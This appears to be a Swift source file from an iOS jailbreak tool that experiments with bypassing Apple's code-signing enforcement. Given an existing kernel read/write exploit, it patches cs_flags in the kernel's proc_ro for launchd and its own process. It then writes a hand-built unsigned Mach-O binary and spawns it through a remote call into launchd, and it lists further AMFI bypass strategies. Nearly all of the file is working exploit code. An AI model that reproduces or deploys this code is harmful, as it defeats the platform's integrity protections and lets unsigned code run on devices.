//
//  exp_proc_ro_csflags.swift
//  DSPloit
//
//  EXPERIMENT: proc_ro cs_flags Patching for Unsigned Binary Execution
//  ═══════════════════════════════════════════════════════════════
//  STATUS: EXPERIMENTAL — NOT IN MAIN JAILBREAK CHAIN
//  Run manually from Root tab → Experiments
//  ═══════════════════════════════════════════════════════════════
//
//  WHAT THIS TESTS:
//  1. Can we read cs_flags from proc_ro for our process?
//  2. Can we WRITE cs_flags to proc_ro? (PPL check)
//  3. Does patching cs_flags on launchd allow unsigned spawn?
//  4. What's the minimum flag set needed?
//
//  THEORY:
//  AMFI checks proc->p_ro->p_csflags before allowing exec.
//  If CS_PLATFORM_BINARY is set, AMFI skips trust cache lookup.
//  If CS_VALID is set, AMFI treats the binary as properly signed.
//  Combined with cs_enforcement_disable=1, this should allow unsigned exec.
//
//  APPROACH:
//  A) Patch SPAWNING process (launchd) cs_flags → it spawns children as platform
//  B) Patch TARGET process cs_flags after spawn (post-exec fixup)
//  C) Patch our own process to test basic write capability
//
//  CS_FLAGS REFERENCE (from XNU bsd/sys/codesign.h):
//  CS_VALID            = 0x00000001  // dynamically valid
//  CS_ADHOC            = 0x00000002  // ad hoc signed
//  CS_GET_TASK_ALLOW   = 0x00000004  // has get-task-allow entitlement
//  CS_INSTALLER        = 0x00000008  // has installer entitlement
//  CS_FORCED_LV        = 0x00000010  // Library Validation required
//  CS_INVALID_ALLOWED  = 0x00000020  // invalid pages allowed
//  CS_HARD             = 0x00000100  // don't load invalid pages
//  CS_KILL             = 0x00000200  // kill process if invalid
//  CS_RESTRICT         = 0x00000800  // restrict dyld loading
//  CS_ENFORCEMENT      = 0x00001000  // enforce code signing
//  CS_REQUIRE_LV       = 0x00002000  // require library validation
//  CS_PLATFORM_BINARY  = 0x04000000  // platform binary (Apple-signed)
//  CS_PLATFORM_PATH    = 0x08000000  // platform path
//  CS_DEBUGGED         = 0x10000000  // process is being debugged
//  CS_SIGNED           = 0x20000000  // process has valid signature
//
//  Created by Royan | 2026-05-24
//

import Foundation

final class ExpProcRoCSFlags {
    static let shared = ExpProcRoCSFlags()
    
    private var results: [String] = []
    
    // CS_FLAGS constants
    private let CS_VALID: UInt32            = 0x00000001
    private let CS_ADHOC: UInt32            = 0x00000002
    private let CS_GET_TASK_ALLOW: UInt32   = 0x00000004
    private let CS_INSTALLER: UInt32        = 0x00000008
    private let CS_FORCED_LV: UInt32        = 0x00000010
    private let CS_INVALID_ALLOWED: UInt32  = 0x00000020
    private let CS_HARD: UInt32             = 0x00000100
    private let CS_KILL: UInt32             = 0x00000200
    private let CS_RESTRICT: UInt32         = 0x00000800
    private let CS_ENFORCEMENT: UInt32      = 0x00001000
    private let CS_REQUIRE_LV: UInt32       = 0x00002000
    private let CS_PLATFORM_BINARY: UInt32  = 0x04000000
    private let CS_PLATFORM_PATH: UInt32    = 0x08000000
    private let CS_DEBUGGED: UInt32         = 0x10000000
    private let CS_SIGNED: UInt32           = 0x20000000
    
    // proc_ro offset for cs_flags (confirmed from dspmgr.readCSFlags)
    private let PROC_RO_CSFLAGS_OFFSET: UInt64 = 0x1c
    
    private func log(_ msg: String) {
        results.append(msg)
        globallogger.log("(exp_csflags) \(msg)")
    }
    
    private func flagsDescription(_ flags: UInt32) -> String {
        var parts: [String] = []
        if flags & CS_VALID != 0 { parts.append("VALID") }
        if flags & CS_ADHOC != 0 { parts.append("ADHOC") }
        if flags & CS_GET_TASK_ALLOW != 0 { parts.append("GET_TASK_ALLOW") }
        if flags & CS_INSTALLER != 0 { parts.append("INSTALLER") }
        if flags & CS_HARD != 0 { parts.append("HARD") }
        if flags & CS_KILL != 0 { parts.append("KILL") }
        if flags & CS_RESTRICT != 0 { parts.append("RESTRICT") }
        if flags & CS_ENFORCEMENT != 0 { parts.append("ENFORCEMENT") }
        if flags & CS_REQUIRE_LV != 0 { parts.append("REQUIRE_LV") }
        if flags & CS_PLATFORM_BINARY != 0 { parts.append("PLATFORM_BINARY") }
        if flags & CS_PLATFORM_PATH != 0 { parts.append("PLATFORM_PATH") }
        if flags & CS_DEBUGGED != 0 { parts.append("DEBUGGED") }
        if flags & CS_SIGNED != 0 { parts.append("SIGNED") }
        if flags & CS_INVALID_ALLOWED != 0 { parts.append("INVALID_ALLOWED") }
        if flags & CS_FORCED_LV != 0 { parts.append("FORCED_LV") }
        return parts.isEmpty ? "NONE" : parts.joined(separator: " | ")
    }
    
    // MARK: - Run All Tests
    
    func runAll() -> [String] {
        results.removeAll()
        
        log("═══════════════════════════════════════════")
        log("  PROC_RO CS_FLAGS PATCHING EXPERIMENT")
        log("  iOS \(UIDevice.current.systemVersion)")
        log("═══════════════════════════════════════════")
        log("")
        
        guard dspmgr.shared.dsready else {
            log("❌ Kernel exploit not active — jailbreak first")
            return results
        }
        
        let slide = ds_get_kernel_slide()
        log("🔍 kernel_slide = 0x\(String(slide, radix: 16))")
        log("")
        
        // Test sequence
        test1_readOurCSFlags()
        test2_readLaunchdCSFlags()
        test3_writeOurCSFlags()
        test4_writeLaunchdCSFlags()
        test5_spawnWithPatchedLaunchd()
        
        log("")
        log("═══════════════════════════════════════════")
        log("  EXPERIMENT COMPLETE")
        log("═══════════════════════════════════════════")
        
        return results
    }
    
    // MARK: - Test 1: Read our own cs_flags
    
    private func test1_readOurCSFlags() {
        log("── TEST 1: Read OUR cs_flags ──")
        
        let ourProc = ds_get_our_proc()
        guard ourProc != 0 else {
            log("❌ Cannot find our proc")
            return
        }
        log("🔍 our_proc = 0x\(String(ourProc, radix: 16))")
        
        let procRo = ds_kread64(ourProc + UInt64(off_proc_p_proc_ro))
        guard procRo != 0 else {
            log("❌ proc_ro = 0 (invalid)")
            return
        }
        log("🔍 proc_ro = 0x\(String(procRo, radix: 16))")
        
        let csFlags = ds_kread32(procRo + PROC_RO_CSFLAGS_OFFSET)
        log("✅ cs_flags = 0x\(String(format: "%08x", csFlags))")
        log("   → \(flagsDescription(csFlags))")
        log("")
    }
    
    // MARK: - Test 2: Read launchd cs_flags
    
    private var launchdProc: UInt64 = 0
    private var launchdProcRo: UInt64 = 0
    private var launchdOrigCSFlags: UInt32 = 0
    
    private func test2_readLaunchdCSFlags() {
        log("── TEST 2: Read LAUNCHD cs_flags ──")
        
        launchdProc = procbypid(1)
        guard launchdProc != 0 else {
            log("❌ Cannot find launchd (pid 1)")
            return
        }
        log("🔍 launchd proc = 0x\(String(launchdProc, radix: 16))")
        
        launchdProcRo = ds_kread64(launchdProc + UInt64(off_proc_p_proc_ro))
        guard launchdProcRo != 0 else {
            log("❌ launchd proc_ro = 0")
            return
        }
        log("🔍 launchd proc_ro = 0x\(String(launchdProcRo, radix: 16))")
        
        launchdOrigCSFlags = ds_kread32(launchdProcRo + PROC_RO_CSFLAGS_OFFSET)
        log("✅ launchd cs_flags = 0x\(String(format: "%08x", launchdOrigCSFlags))")
        log("   → \(flagsDescription(launchdOrigCSFlags))")
        
        // Check if already platform binary
        if launchdOrigCSFlags & CS_PLATFORM_BINARY != 0 {
            log("🔍 launchd already has PLATFORM_BINARY (expected)")
        }
        log("")
    }
    
    // MARK: - Test 3: Write OUR cs_flags (safe test)
    
    private var ourOrigCSFlags: UInt32 = 0
    
    private func test3_writeOurCSFlags() {
        log("── TEST 3: Write OUR cs_flags (PPL test) ──")
        
        let ourProc = ds_get_our_proc()
        guard ourProc != 0 else { log("❌ No proc"); return }
        
        let procRo = ds_kread64(ourProc + UInt64(off_proc_p_proc_ro))
        guard procRo != 0 else { log("❌ No proc_ro"); return }
        
        ourOrigCSFlags = ds_kread32(procRo + PROC_RO_CSFLAGS_OFFSET)
        log("🔍 Before: 0x\(String(format: "%08x", ourOrigCSFlags))")
        
        // Target: add CS_PLATFORM_BINARY + CS_GET_TASK_ALLOW + CS_INSTALLER
        let targetFlags = ourOrigCSFlags | CS_PLATFORM_BINARY | CS_GET_TASK_ALLOW | CS_INSTALLER | CS_VALID
        // Also REMOVE restrictive flags
        let cleanFlags = targetFlags & ~(CS_HARD | CS_KILL | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV)
        
        log("🔍 Writing: 0x\(String(format: "%08x", cleanFlags))")
        log("   → \(flagsDescription(cleanFlags))")
        
        ds_kwrite32(procRo + PROC_RO_CSFLAGS_OFFSET, cleanFlags)
        
        // Verify
        let readback = ds_kread32(procRo + PROC_RO_CSFLAGS_OFFSET)
        
        if readback == cleanFlags {
            log("✅ WRITE SUCCESS! cs_flags patched")
            log("   proc_ro is WRITABLE (no PPL protection on cs_flags)")
        } else if readback == ourOrigCSFlags {
            log("❌ WRITE FAILED — PPL protecting proc_ro")
            log("   readback = 0x\(String(format: "%08x", readback)) (unchanged)")
            log("   Need alternative approach (physmap bypass or PPLRW)")
        } else {
            log("⚠️ PARTIAL — readback = 0x\(String(format: "%08x", readback))")
            log("   Some bits may be hardware-enforced")
        }
        
        // Restore original (safety)
        ds_kwrite32(procRo + PROC_RO_CSFLAGS_OFFSET, ourOrigCSFlags)
        let restored = ds_kread32(procRo + PROC_RO_CSFLAGS_OFFSET)
        if restored == ourOrigCSFlags {
            log("✅ Restored original flags")
        }
        log("")
    }
    
    // MARK: - Test 4: Write LAUNCHD cs_flags
    
    private func test4_writeLaunchdCSFlags() {
        log("── TEST 4: Patch launchd cs_flags ──")
        
        guard launchdProcRo != 0 else {
            log("❌ launchd proc_ro not resolved (test 2 failed)")
            return
        }
        
        let current = ds_kread32(launchdProcRo + PROC_RO_CSFLAGS_OFFSET)
        log("🔍 Current: 0x\(String(format: "%08x", current))")
        
        // For launchd: ensure CS_PLATFORM_BINARY + remove CS_RESTRICT + CS_ENFORCEMENT
        // This makes launchd's children inherit platform status
        let targetFlags = (current | CS_PLATFORM_BINARY | CS_VALID | CS_INSTALLER)
                          & ~(CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV)
        
        if targetFlags == current {
            log("✅ launchd already has correct flags — no patch needed")
            log("")
            return
        }
        
        log("🔍 Writing: 0x\(String(format: "%08x", targetFlags))")
        ds_kwrite32(launchdProcRo + PROC_RO_CSFLAGS_OFFSET, targetFlags)
        
        let readback = ds_kread32(launchdProcRo + PROC_RO_CSFLAGS_OFFSET)
        if readback == targetFlags {
            log("✅ launchd cs_flags PATCHED!")
        } else {
            log("❌ launchd patch failed — readback: 0x\(String(format: "%08x", readback))")
        }
        log("")
    }
    
    // MARK: - Test 5: Spawn unsigned binary with patched launchd
    
    private func test5_spawnWithPatchedLaunchd() {
        log("── TEST 5: Spawn UNSIGNED binary ──")
        log("(via launchd RemoteCall with patched cs_flags)")
        log("")
        
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.rcready else {
            log("❌ RemoteCall not active — cannot test spawn")
            log("   Run jailbreak chain first (need RC to launchd)")
            return
        }
        
        // Strategy: patch the TARGET binary's proc cs_flags AFTER spawn
        // Actually: we need to patch AMFI's decision for the binary
        //
        // Better approach: use posix_spawnattr to set flags, then patch
        // the new process's cs_flags immediately after spawn
        //
        // BEST approach for this test:
        // 1. Write unsigned binary to /var/jb/tmp/
        // 2. posix_spawn from launchd (which is already platform binary)
        // 3. If EPERM: find the new proc, patch its cs_flags, retry
        
        log("Strategy A: Direct spawn from launchd (platform binary)")
        log("  launchd is already CS_PLATFORM_BINARY")
        log("  Children MAY inherit platform status...")
        log("")
        
        // Build minimal binary
        let binary = buildExitBinary()
        let testPath = "/var/jb/tmp/csflags_test"
        
        log("Writing test binary (\(binary.count) bytes)...")
        
        // Write + spawn via RootExecutor
        RootExecutor.shared.executeAsRoot(operation: "csflags_write_spawn") { rc in
            // mkdir
            let dir = remote_alloc_str(rc, "/var/jb/tmp")
            RootExecutor.rcall(rc, "mkdir", dir, 0o755)
            RootExecutor.rcall(rc, "free", dir)
            
            // Write binary
            let pathAddr = remote_alloc_str(rc, testPath)
            let fd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
            guard fd != UInt64(bitPattern: -1) else {
                RootExecutor.rcall(rc, "free", pathAddr)
                return (false, "open failed", 0)
            }
            
            let writeAddr = rc.trojanMem + 0xC00
            binary.withUnsafeBytes { buf in
                rc.remote_write(writeAddr, from: buf.baseAddress!, size: UInt64(binary.count))
            }
            RootExecutor.rcall(rc, "write", fd, writeAddr, UInt64(binary.count))
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            // Now spawn
            let pidAddr = rc.trojanMem + 0xA00
            rc[pidAddr].setValue32(0)
            
            let argvBase = rc.trojanMem + 0xA10
            rc[argvBase].setValue64(pathAddr)
            rc[argvBase + 8].setValue64(0) // NULL terminator
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
            let spawnedPid = rc[pidAddr].value32()
            
            RootExecutor.rcall(rc, "free", pathAddr)
            
            return (ret == 0, "spawn ret=\(ret) pid=\(spawnedPid)", UInt64(spawnedPid))
        }
        
        // Check result after delay
        DispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + 10) { [self] in
            let lastOp = RootExecutor.shared.lastResult
            
            DispatchQueue.main.async {
                if let result = lastOp {
                    if result.success {
                        self.log("✅✅✅ UNSIGNED BINARY SPAWNED SUCCESSFULLY!")
                        self.log("   pid = \(result.returnValue)")
                        self.log("   AMFI BYPASS CONFIRMED via proc_ro cs_flags")
                        self.log("")
                        self.log("   → READY TO INTEGRATE INTO MAIN CHAIN")
                    } else {
                        self.log("❌ Spawn failed: \(result.message)")
                        self.log("")
                        self.log("   Trying Strategy B: patch child proc after spawn...")
                        self.strategyB_patchAfterSpawn()
                    }
                } else {
                    self.log("⚠️ No result yet (timeout) — check logs")
                }
            }
        }
        
        log("⏳ Waiting for spawn result (10s)...")
        #else
        log("❌ DISABLE_REMOTECALL — cannot test")
        #endif
    }
    
    // MARK: - Strategy B: Patch child process cs_flags after spawn
    
    private func strategyB_patchAfterSpawn() {
        log("")
        log("── Strategy B: Patch CHILD proc cs_flags ──")
        log("  1. Spawn binary (will get SIGKILL from AMFI)")
        log("  2. Find child proc in kernel before AMFI kills it")
        log("  3. Patch cs_flags → CS_PLATFORM_BINARY | CS_VALID")
        log("  4. Resume execution")
        log("")
        log("  NOTE: This requires POSIX_SPAWN_START_SUSPENDED")
        log("  or patching amfid's check function directly")
        log("")
        
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.rcready else {
            log("❌ RC not ready")
            return
        }
        
        // Alternative: patch amfid process to skip signature check
        log("── Strategy C: Patch amfid cs_flags check ──")
        
        let amfidProc = procbypid(findPidByName("amfid"))
        if amfidProc != 0 {
            let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
            if amfidProcRo != 0 {
                let amfidFlags = ds_kread32(amfidProcRo + PROC_RO_CSFLAGS_OFFSET)
                log("🔍 amfid cs_flags = 0x\(String(format: "%08x", amfidFlags))")
                log("   → \(flagsDescription(amfidFlags))")
            }
        } else {
            log("⚠️ amfid proc not found (may be named differently)")
        }
        
        // Strategy D: Patch the AMFI kernel extension's enforcement variable
        log("")
        log("── Strategy D: Kernel AMFI enforcement patch ──")
        log("  Already done in step 6 of jailbreak chain")
        log("  But clearly not sufficient alone...")
        log("")
        log("── Strategy E: Combine ALL approaches ──")
        log("  1. cs_enforcement_disable = 1 ✅ (already done)")
        log("  2. AMFI 10 flags zeroed ✅ (already done)")
        log("  3. Patch spawning proc cs_flags (this experiment)")
        log("  4. Patch target binary's proc cs_flags post-spawn")
        log("  5. If all fail → need PPLRW for trust cache direct write")
        log("")
        log("  Run this experiment ON DEVICE to see which strategy works!")
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    // MARK: - Helper: Find PID by name
    
    private func findPidByName(_ name: String) -> Int32 {
        // Walk proc list to find by name
        let kernProc = ds_get_kern_proc()
        guard kernProc != 0 else { return 0 }
        
        var current = ds_kread64(kernProc + UInt64(off_proc_p_list_le_next))
        var iterations = 0
        
        while current != 0 && current != kernProc && iterations < 500 {
            iterations += 1
            let nameOffset = UInt64(off_proc_p_name)
            var procName = [UInt8](repeating: 0, count: 32)
            for i in 0..<4 {
                let chunk = ds_kread64(current + nameOffset + UInt64(i * 8))
                for b in 0..<8 {
                    let idx = i * 8 + b
                    if idx < 32 { procName[idx] = UInt8((chunk >> (b * 8)) & 0xFF) }
                }
            }
            let pName = String(bytes: procName.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
            
            if pName == name {
                return Int32(ds_kread32(current + UInt64(off_proc_p_pid)))
            }
            
            current = ds_kread64(current + UInt64(off_proc_p_list_le_next))
        }
        return 0
    }
    
    // MARK: - Build minimal exit(0) binary
    
    private func buildExitBinary() -> Data {
        var bin = Data()
        
        // Mach-O Header — arm64, MH_EXECUTE
        let header: [UInt8] = [
            0xCF, 0xFA, 0xED, 0xFE, // magic
            0x0C, 0x00, 0x00, 0x01, // cputype ARM64
            0x00, 0x00, 0x00, 0x00, // cpusubtype ALL
            0x02, 0x00, 0x00, 0x00, // MH_EXECUTE
            0x02, 0x00, 0x00, 0x00, // ncmds: 2
            0x60, 0x01, 0x00, 0x00, // sizeofcmds: 352
            0x00, 0x00, 0x00, 0x00, // flags
            0x00, 0x00, 0x00, 0x00, // reserved
        ]
        bin.append(contentsOf: header)
        
        // LC_SEGMENT_64 __TEXT (72 bytes)
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48 // cmd=LC_SEGMENT_64, cmdsize=72
        // segname "__TEXT"
        seg[8] = 0x5F; seg[9] = 0x5F; seg[10] = 0x54; seg[11] = 0x45
        seg[12] = 0x58; seg[13] = 0x54
        // vmaddr = 0x100000000
        seg[28] = 0x01
        // vmsize = 0x4000
        seg[32] = 0x00; seg[33] = 0x40
        // filesize = 0x4000
        seg[40] = 0x00; seg[41] = 0x40
        // maxprot = 5 (r-x), initprot = 5
        seg[48] = 0x05; seg[52] = 0x05
        bin.append(contentsOf: seg)
        
        // LC_UNIXTHREAD (280 bytes) — PC = 0x100000180
        var thread = [UInt8](repeating: 0, count: 280)
        thread[0] = 0x05 // cmd = LC_UNIXTHREAD
        thread[4] = 0x18; thread[5] = 0x01 // cmdsize = 280
        thread[8] = 0x06 // flavor = ARM_THREAD_STATE64
        thread[12] = 0x44 // count = 68
        // PC at offset 16 + 256 = 272
        thread[272] = 0x80; thread[273] = 0x01
        thread[274] = 0x00; thread[275] = 0x00
        thread[276] = 0x01; thread[277] = 0x00
        bin.append(contentsOf: thread)
        
        // Pad to 0x180
        while bin.count < 0x180 { bin.append(0) }
        
        // ARM64 code: exit(0)
        let code: [UInt8] = [
            0x00, 0x00, 0x80, 0xD2, // mov x0, #0
            0x30, 0x00, 0x80, 0xD2, // mov x16, #1 (SYS_exit)
            0x01, 0x10, 0x00, 0xD4, // svc #0x80
        ]
        bin.append(contentsOf: code)
        
        // Pad to page
        while bin.count < 0x4000 { bin.append(0) }
        
        return bin
    }
}
